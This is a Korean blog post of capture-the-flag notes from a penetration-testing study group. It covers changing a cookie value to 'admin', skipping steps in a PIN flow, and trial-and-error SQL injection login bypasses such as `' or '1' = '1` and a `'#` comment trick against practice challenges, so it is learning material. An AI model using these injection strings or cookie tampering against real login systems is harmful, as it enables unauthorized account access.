---
layout: post
comments: true

title: "쿠키 변조와 SQL Injection을 이용한 인증 우회 CTF 풀이"
excerpt: "모의해킹 취업반 스터디 7기 5주차"

date: 2024-11-18
last_modified_at:

categories: [CTF]
tags: [TIL, WEB, DATABASE, CTF]
---

[쿠키와 세션의 동작 방식]({% post_url DEVELOPMENT/WEB/2024-11-04-WEB-Cookie-and-Session-Cache %})과 [SQL Injection의 기본 원리]({% post_url SECURITY/SECURITY_FUNDAMENTALS/2024-11-14-SQL-Injection %})를 바탕으로 문제의 인증 흐름을 분석한 풀이이다.

# get admin
<img src = "/_image/2024-11-18-00-00-00.png">
쿠키값을 admin으로 바꾸면 clear

# pin code bypass
<img src = "/_image/2024-11-18-00-00-01.png">
<img src = "/_image/2024-11-18-00-00-02.png">
step1 -> step2 -> step3일거라 예상
step3로 값 주면 clear

# Admin is Mine
1. 
id: doldol
pw: dol1234
2. 
id: doldol(')#
pw: dol1234
-> 실행X -> python인가? php도 `#`으로 주석처리가 되는구나??
3. 
id: doldol(')//
pw: dol1234
-> X, 얘는 왜 실행은 되는거냐?
4. 
id: doldol'--
pw: dol1234
-> X
5. 
doldol' join select * from member where userID like 'a%
dol1234
-> X

# Pin Code Crack

# Login Bypass 1
1. 
id: doldol
pw: dol1234
2. 
doldol' or '1' = '1
dol1234
3. 
normaltic' or '1' = '1
asdf
-> O

# login bypass 2
login bypass 1에서 로그인한 상태로 접속하면 로그인 상태로 접속되길래 normaltic2로 시도해봄.
-> login bypass끼리 sql 공유하는 듯
<img src = "/_image/2024-11-18-00-00-03.png">
플래그는 안 보임 ㄲㅂ

1. 
id: doldol
pw: dol1234
2. 
id: doldol'or
pw: dol1234
3. 
id: doldol'or
pw: dol1234'or
4. 
id: doldol' or
pw: dol1234' or
-> X
5. 
id: normaltic2'#
pw: asdf
-> O

<div class="obsidian-links" style="display: none;">

[\[SECURITY\] SQL Injection 정리](../SECURITY_FUNDAMENTALS/2024-11-14-SQL-Injection.md)

</div>
